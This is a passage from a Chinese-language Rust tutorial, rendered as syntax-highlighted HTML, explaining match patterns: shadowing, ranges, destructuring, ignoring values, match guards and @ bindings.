class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> x &#123;</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;one&quot;</span>),</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;two&quot;</span>),</span><br><span class="line">    <span class="number">3</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;three&quot;</span>),</span><br><span class="line">    _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;anything&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="匹配命名变量"><a href="#匹配命名变量" class="headerlink" title="匹配命名变量"></a>匹配命名变量</h5><p>在match中存在变量遮蔽问题，这个在<strong>匹配命名变量</strong>时会遇到</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">Some</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> x &#123;</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(<span class="number">50</span>) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Got 50&quot;</span>),</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(y) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Matched, y = &#123;:?&#125;&quot;</span>, y),</span><br><span class="line">        _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Default case, x = &#123;:?&#125;&quot;</span>, x),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;at the end: x = &#123;:?&#125;, y = &#123;:?&#125;&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当match运行时，第一个匹配分支的模式并不匹配x中定义的值，所以代码继续执行</p><p>第二个匹配分支中的模式引入了一个新的变量y，他会匹配some的任何值，由于这里的y在match表达式的作用域总，所以这是一个新变量，而不是开头声明的y</p><p>如果 <code>x</code> 的值是 <code>None</code> 而不是 <code>Some(5)</code>，头两个分支的模式不会匹配，所以会匹配模式 <code>_</code>。这个分支的模式中没有引入变量 <code>x</code>，所以此时表达式中的 <code>x</code> 会是外部没有被遮蔽的 <code>x</code>，也就是 <code>None</code>。</p><p>如果你不想引入变量遮蔽，可以使用另一个变量名而非 <code>y</code>，或者使用匹配守卫(match guard)的方式，稍后在<a href="https://course.rs/basic/match-pattern/all-patterns.html#%E5%8C%B9%E9%85%8D%E5%AE%88%E5%8D%AB%E6%8F%90%E4%BE%9B%E7%9A%84%E9%A2%9D%E5%A4%96%E6%9D%A1%E4%BB%B6">匹配守卫提供的额外条件</a>中会讲解。</p><h5 id="单支多模式"><a href="#单支多模式" class="headerlink" title="单支多模式"></a>单支多模式</h5><p>在match表达式中，可以使用<code>|</code>语法匹配多个模式</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> x &#123;</span><br><span class="line">    <span class="number">1</span> | <span class="number">2</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;one or two&quot;</span>),</span><br><span class="line">    <span class="number">3</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;three&quot;</span>),</span><br><span class="line">    _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;anything&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码会打印one or two</p><h5 id="通过-匹配值的范围"><a href="#通过-匹配值的范围" class="headerlink" title="通过..&#x3D;匹配值的范围"></a>通过..&#x3D;匹配值的范围</h5><p>在<a href="https://course.rs/basic/base-type/numbers.html#%E5%BA%8F%E5%88%97range">数值类型</a>中我们有讲到一个序列语法，该语法不仅可以用于循环中，还能用于匹配模式</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> x &#123;</span><br><span class="line">    <span class="number">1</span>..=<span class="number">5</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;one through five&quot;</span>),</span><br><span class="line">    _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;something else&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果x的值是1,2,3,4,5就会匹配到1..&#x3D;5</p><h5 id="解构并分解值"><a href="#解构并分解值" class="headerlink" title="解构并分解值"></a>解构并分解值</h5><p>也可以使用模式来解构结构体、枚举、元组、数组和引用</p><h6 id="解构结构体"><a href="#解构结构体" class="headerlink" title="解构结构体"></a>解构结构体</h6><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    x: <span class="type">i32</span>,</span><br><span class="line">    y: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">p</span> = Point &#123; x: <span class="number">0</span>, y: <span class="number">7</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">Point</span> &#123; x: a, y: b &#125; = p;</span><br><span class="line">    <span class="built_in">assert_eq!</span>(<span class="number">0</span>, a);</span><br><span class="line">    <span class="built_in">assert_eq!</span>(<span class="number">7</span>, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码创建了变量a，b来匹配结构体p中的x和y</p><p>字段，这个例子展示了<strong>模式中的变量名不必与结构体中的字段名一致</strong>。不过通常希望变量名与字段名一致以便于理解变量来自于哪些字段。</p><h6 id="解构枚举"><a href="#解构枚举" class="headerlink" title="解构枚举"></a>解构枚举</h6><p>​       下面代码以 <code>Message</code> 枚举为例，编写一个 <code>match</code> 使用模式解构每一个内部值：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    Quit,</span><br><span class="line">    Move &#123; x: <span class="type">i32</span>, y: <span class="type">i32</span> &#125;,</span><br><span class="line">    <span class="title function_ invoke__">Write</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">ChangeColor</span>(<span class="type">i32</span>, <span class="type">i32</span>, <span class="type">i32</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">msg</span> = Message::<span class="title function_ invoke__">ChangeColor</span>(<span class="number">0</span>, <span class="number">160</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> msg &#123;</span><br><span class="line">        Message::Quit =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;The Quit variant has no data to destructure.&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        Message::Move &#123; x, y &#125; =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(</span><br><span class="line">                <span class="string">&quot;Move in the x direction &#123;&#125; and in the y direction &#123;&#125;&quot;</span>,</span><br><span class="line">                x,</span><br><span class="line">                y</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        Message::<span class="title function_ invoke__">Write</span>(text) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Text message: &#123;&#125;&quot;</span>, text),</span><br><span class="line">        Message::<span class="title function_ invoke__">ChangeColor</span>(r, g, b) =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(</span><br><span class="line">                <span class="string">&quot;Change the color to red &#123;&#125;, green &#123;&#125;, and blue &#123;&#125;&quot;</span>,</span><br><span class="line">                r,</span><br><span class="line">                g,</span><br><span class="line">                b</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里老生常谈一句话，模式匹配一样要类型相同，因此匹配 <code>Message::Move&#123;1,2&#125;</code> 这样的枚举值，就必须要用 <code>Message::Move&#123;x,y&#125;</code> 这样的同类型模式才行。这段代码会打印出 <code>Change the color to red 0, green 160, and blue 255</code>。尝试改变 <code>msg</code> 的值来观察其他分支代码的运行。         </p><h6 id="解构嵌套的结构体和枚举"><a href="#解构嵌套的结构体和枚举" class="headerlink" title="解构嵌套的结构体和枚举"></a>解构嵌套的结构体和枚举</h6><p>目前为止，所有的例子都只匹配了深度为一级的结构体或枚举。 <code>match</code> 也可以匹配嵌套的项！</p><p>例如使用下面的代码来同时支持 RGB 和 HSV 色彩模式：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">   <span class="title function_ invoke__">Rgb</span>(<span class="type">i32</span>, <span class="type">i32</span>, <span class="type">i32</span>),</span><br><span class="line">   <span class="title function_ invoke__">Hsv</span>(<span class="type">i32</span>, <span class="type">i32</span>, <span class="type">i32</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    Quit,</span><br><span class="line">    Move &#123; x: <span class="type">i32</span>, y: <span class="type">i32</span> &#125;,</span><br><span class="line">    <span class="title function_ invoke__">Write</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">ChangeColor</span>(Color),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">msg</span> = Message::<span class="title function_ invoke__">ChangeColor</span>(Color::<span class="title function_ invoke__">Hsv</span>(<span class="number">0</span>, <span class="number">160</span>, <span class="number">255</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> msg &#123;</span><br><span class="line">        Message::<span class="title function_ invoke__">ChangeColor</span>(Color::<span class="title function_ invoke__">Rgb</span>(r, g, b)) =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(</span><br><span class="line">                <span class="string">&quot;Change the color to red &#123;&#125;, green &#123;&#125;, and blue &#123;&#125;&quot;</span>,</span><br><span class="line">                r,</span><br><span class="line">                g,</span><br><span class="line">                b</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">        Message::<span class="title function_ invoke__">ChangeColor</span>(Color::<span class="title function_ invoke__">Hsv</span>(h, s, v)) =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(</span><br><span class="line">                <span class="string">&quot;Change the color to hue &#123;&#125;, saturation &#123;&#125;, and value &#123;&#125;&quot;</span>,</span><br><span class="line">                h,</span><br><span class="line">                s,</span><br><span class="line">                v</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">        _ =&gt; ()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>match</code> 第一个分支的模式匹配一个 <code>Message::ChangeColor</code> 枚举成员，该枚举成员又包含了一个 <code>Color::Rgb</code> 的枚举成员，最终绑定了 3 个内部的 <code>i32</code> 值p><h6 id="解构结构体和元组"><a href="#解构结构体和元组" class="headerlink" title="解构结构体和元组"></a>解构结构体和元组</h6><p>我们可以用复杂的方式来混合、匹配和嵌套解构模式。如下是一个复杂结构体的例子，其中结构体和元组嵌套在元组中，并将所有的原始类型解构出来</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">     x: <span class="type">i32</span>,</span><br><span class="line">     y: <span class="type">i32</span>,</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ((feet, inches), Point &#123;x, y&#125;) = ((<span class="number">3</span>, <span class="number">10</span>), Point &#123; x: <span class="number">3</span>, y: -<span class="number">10</span> &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="解构数组"><a href="#解构数组" class="headerlink" title="解构数组"></a>解构数组</h6><p>对于数组，我们可以用类似元组的方式进行解构，分为两种情况</p><p>定长数组:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">arr</span>: [<span class="type">u16</span>; <span class="number">2</span>] = [<span class="number">114</span>, <span class="number">514</span>];</span><br><span class="line"><span class="keyword">let</span> [x, y] = arr;</span><br><span class="line"></span><br><span class="line"><span class="built_in">assert_eq!</span>(x, <span class="number">114</span>);</span><br><span class="line"><span class="built_in">assert_eq!</span>(y, <span class="number">514</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不定长数组</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">arr</span>: &amp;[<span class="type">u16</span>] = &amp;[<span class="number">114</span>, <span class="number">514</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> [x, ..] = arr &#123;</span><br><span class="line">    <span class="built_in">assert_eq!</span>(x, &amp;<span class="number">114</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> &amp;[.., y] = arr &#123;</span><br><span class="line">    <span class="built_in">assert_eq!</span>(y, <span class="number">514</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">arr</span>: &amp;[<span class="type">u16</span>] = &amp;[];</span><br><span class="line"></span><br><span class="line"><span class="built_in">assert!</span>(matches!(arr, [..]));</span><br><span class="line"><span class="built_in">assert!</span>(!matches!(arr, [x, ..]));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="忽略模式中的值"><a href="#忽略模式中的值" class="headerlink" title="忽略模式中的值"></a>忽略模式中的值</h5><p>又是忽略模式的一些值也是很有用的，比如在match中的最后一个分支使用_模式匹配所有剩余的值。也可以在另一个模式中使用_模式，使用一个亿下划线开始的名称，或者使用..忽略所剩部分的值</p><h6 id="使用-忽略整个值"><a href="#使用-忽略整个值" class="headerlink" title="使用_忽略整个值"></a>使用_忽略整个值</h6><p>虽然 <code>_</code> 模式作为 <code>match</code> 表达式最后的分支特别有用，但是它的作用还不限于此。例如可以将其用于函数参数中：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">foo</span>(_: <span class="type">i32</span>, y: <span class="type">i32</span>) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;This code only uses the y parameter: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="title function_ invoke__">foo</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码会完全忽略作为第一个参数传递的值 <code>3</code>，并会打印出 <code>This code only uses the y parameter: 4</code>。</p><p>大部分情况当你不再需要特定函数参数时，最好修改签名不再包含无用的参数。在一些情况下忽略函数参数会变得特别有用，比如实现特征时，当你需要特定类型签名但是函数实现并不需要某个参数时。此时编译器就<strong>不会警告说存在未使用的函数参数</strong>，就跟使用命名参数一样。</p><h6 id="使用嵌套的-忽略部分值"><a href="#使用嵌套的-忽略部分值" class="headerlink" title="使用嵌套的_忽略部分值"></a>使用嵌套的_忽略部分值</h6><p>可以在一个模式内部使用_忽略部分值</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">setting_value</span> = <span class="title function_ invoke__">Some</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">new_setting_value</span> = <span class="title function_ invoke__">Some</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> (setting_value, new_setting_value) &#123;</span><br><span class="line">    (<span class="title function_ invoke__">Some</span>(_), <span class="title function_ invoke__">Some</span>(_)) =&gt; &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Can&#x27;t overwrite an existing customized value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    _ =&gt; &#123;</span><br><span class="line">        setting_value = new_setting_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;setting is &#123;:?&#125;&quot;</span>, setting_value);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码会打印出 <code>Can&#39;t overwrite an existing customized value</code> 接着是 <code>setting is Some(5)</code>。</p><p>第一个匹配分支，我们不关心里面的值，只关心元组中两个元素的类型，因此对于 <code>Some</code> 中的值，直接进行忽略。 剩下的形如 <code>(Some(_),None)</code>，<code>(None, Some(_))</code>, <code>(None,None)</code> 形式，都由第二个分支 <code>_</code> 进行分配。</p><h6 id="使用下划线忽略未使用的变量"><a href="#使用下划线忽略未使用的变量" class="headerlink" title="使用下划线忽略未使用的变量"></a>使用下划线忽略未使用的变量</h6><p>如果你创建了一个变量却不在任何地方使用它就需要使用_放在变量开头来忽略它</p><p>注意, 只使用 <code>_</code> 和使用以下划线开头的名称有些微妙的不同：比如 <strong><code>_x</code> 仍会将值绑定到变量，而 <code>_</code> 则完全不会绑定</strong>。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="title function_ invoke__">Some</span>(<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello!&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(_s) = s &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;found a string&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, s);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>s</code> 是一个拥有所有权的动态字符串，在上面代码中，我们会得到一个错误，因为 <code>s</code> 的值会被转移给 <code>_s</code>，在 <code>println!</code> 中再次使用 <code>s</code> 会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s 是一个拥有所有权的动态字符串，在上面代码中，我们会得到一个错误，因为 s 的值会被转移给 _s，在 println! 中再次使用 s 会报错：</span><br></pre></td></tr></table></figure><p>只使用下滑线本身就不会绑定值了，因为s没有移动进_:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="title function_ invoke__">Some</span>(<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello!&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(_) = s &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;found a string&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, s);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="匹配守卫提供的额外条件"><a href="#匹配守卫提供的额外条件" class="headerlink" title="匹配守卫提供的额外条件"></a>匹配守卫提供的额外条件</h5><p>匹配守卫是一个位于match分支模式之后的额外的if条件，它能为分支模式提供更进一步的匹配条件</p><p>这个条件可以使用模式中创建的变量：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">num</span> = <span class="title function_ invoke__">Some</span>(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> num &#123;</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(x) <span class="keyword">if</span> x &lt; <span class="number">5</span> =&gt; <span class="built_in">println!</span>(<span class="string">&quot;less than five: &#123;&#125;&quot;</span>, x),</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(x) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x),</span><br><span class="line">    <span class="literal">None</span> =&gt; (),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子会打印出 <code>less than five: 4</code>。当 <code>num</code> 与模式中第一个分支匹配时，<code>Some(4)</code> 可以与 <code>Some(x)</code> 匹配，接着匹配守卫检查 <code>x</code> 值是否小于 5，因为 4 小于 5，所以第一个分支被选择。</p><p>相反如果 <code>num</code> 为 <code>Some(10)</code>，因为 10 不小于 5 ，所以第一个分支的匹配守卫为假。接着 Rust 会前往第二个分支，因为这里没有匹配守卫所以会匹配任何 <code>Some</code> 成员。</p><p>模式中无法提供类如 <code>if x &lt; 5</code> 的表达能力，我们可以通过匹配守卫的方式来实现。</p><h5 id="绑定"><a href="#绑定" class="headerlink" title="@绑定"></a>@绑定</h5><p>@运算符允许为一个字段绑定另外一个变量。下面例子中，我们希望测试Message::hello的id字段是否位于3..&#x3D;7的范围内，同时也希望能将其值绑定到 <code>id_variable</code> 变量中以便此分支中相关的代码可以使用它。我们可以将 <code>id_variable</code> 命名为 <code>id</code>，与字段同名，不过出于示例的目的这里选择了不同的名称。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    Hello &#123; id: <span class="type">i32</span> &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">msg</span> = Message::Hello &#123; id: <span class="number">5</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> msg &#123;</span><br><span class="line">    Message::Hello &#123; id: id_variable @ <span class="number">3</span>..=<span class="number">7</span> &#125; =&gt; &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Found an id in range: &#123;&#125;&quot;</span>, id_variable)</span><br><span class="line">    &#125;,</span><br><span class="line">    Message::Hello &#123; id: <span class="number">10</span>..=<span class="number">12</span> &#125; =&gt; &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Found an id in another range&quot;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    Message::Hello &#123; id &#125; =&gt; &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Found some other id: &#123;&#125;&quot;</span>, id)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上例会打印出 <code>Found an id in range: 5</code>。通过在 <code>3..=7</code> 之前指定 <code>id_variable @</code>，我们捕获了任何匹配此范围的值并同时将该值绑定到变量 <code>id_variable</code> 上。</p><p>第二个分支只在模式中指定了一个范围，<code>id</code> 字段的值可以是 <code>10、11 或 12</code>，不过这个模式的代码并不知情也不能使用 <code>id</code> 字段中的值，因为没有将 <code>id</code> 值保存进一个变量。</p><p>最后一个分支指定了一个没有范围的变量，此时确实拥有可以用于分支代码的变量 <code>id</code>，因为这里使用了结构体字段简写语法。不过此分支中没有像头两个分支那样对 <code>id</code> 字段的值进行测试：任何值都会匹配此分支。</p><p>当你既想要限定分支范围，又想要使用分支的变量时，就可以用 <code>@</code> 来绑定到一个新的变量上，实现想要的功能。</p><h6 id="前绑定后解构-Rust-1-56-新增"><a href="#前绑定后解构-Rust-1-56-新增" class="headerlink" title="@前绑定后解构(Rust 1.56 新增)"></a>@前绑定后解构(Rust 1.56 新增)</h6><p>使用 <code>@</code> 还可以在绑定新变量的同时，对目标进行解构：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    x: <span class="type">i32</span>,</span><br><span class="line">    y: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() 